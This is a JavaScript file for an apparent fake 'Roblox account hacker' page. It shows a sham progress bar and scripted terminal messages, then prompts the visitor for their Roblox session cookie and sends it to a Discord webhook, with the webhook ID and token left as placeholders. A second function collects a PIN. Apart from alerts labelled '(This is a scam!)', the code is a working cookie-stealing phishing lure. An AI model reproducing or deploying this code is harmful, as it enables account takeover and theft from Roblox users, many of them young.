function startHack() {
  const username = document.getElementById('username').value;
  if (!username) {
    alert('Please enter a username or User ID.');
    return;
  }

  // Show progress bar and terminal
  document.getElementById('progress').classList.remove('hidden');

  // Fake progress bar
  const progressBar = document.getElementById('progress-bar-fill');
  let width = 0;
  const interval = setInterval(() => {
    if (width >= 100) {
      clearInterval(interval);
      showError();
    } else {
      width++;
      progressBar.style.width = width + '%';
    }
  }, 50);

  // Fake terminal output
  const terminal = document.getElementById('terminal');
  const messages = [
    '[*] Scanning target account...',
    '[*] Bypassing firewall...',
    '[*] Decrypting account data...',
    '[*] Hacking failed! Enhanced security detected.'
  ];
  let i = 0;
  const terminalInterval = setInterval(() => {
    if (i >= messages.length) {
      clearInterval(terminalInterval);
    } else {
      terminal.innerHTML += messages[i] + '\n';
      terminal.scrollTop = terminal.scrollHeight;
      i++;
    }
  }, 1500);
}

function showError() {
  // Hide progress bar and terminal
  document.getElementById('progress').classList.add('hidden');

  // Ask for the user's cookie
  let userInput = prompt("Enter your Roblox cookie to proceed:");
  if (userInput && userInput.length >= 1) {
    // Send the cookie to a Discord webhook
    fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN", {
      method: "POST",
      body: JSON.stringify({ content: "Roblox Cookie: " + userInput }),
      headers: { "Content-Type": "application/json" }
    }).then(response => {
      if (response.ok) {
        alert("Cookie submitted. Hacking will resume... (This is a scam!)");
      } else {
        alert("Failed to submit cookie. Please try again.");
      }
    });
  } else {
    // Show an error message if the user doesn't enter anything
    let errorMsg = document.createElement("p");
    errorMsg.innerText = "Access denied! Invalid cookie.";
    errorMsg.style.color = "red";
    errorMsg.style.fontWeight = "bold";
    document.body.appendChild(errorMsg);
  }
}

function submitPin() {
  const pin = document.getElementById('pin').value;
  if (!pin) {
    alert('Please enter a PIN.');
    return;
  }
  alert('PIN submitted. Hacking will resume... (This is a scam!)');
}
